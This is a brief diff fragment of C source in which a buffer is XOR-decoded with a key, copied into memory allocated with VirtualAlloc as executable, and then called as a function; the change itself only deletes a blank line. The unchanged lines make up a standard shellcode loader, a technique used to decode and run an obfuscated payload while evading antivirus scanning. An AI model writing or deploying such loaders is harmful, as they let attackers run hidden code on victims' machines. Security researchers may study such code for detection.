@@ -173,7 +173,6 @@ int main()
   buf[i] = buf[i]^key;
  }
  
- 
  void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(exec, buf, sizeof buf);
  ((void(*)())exec)();
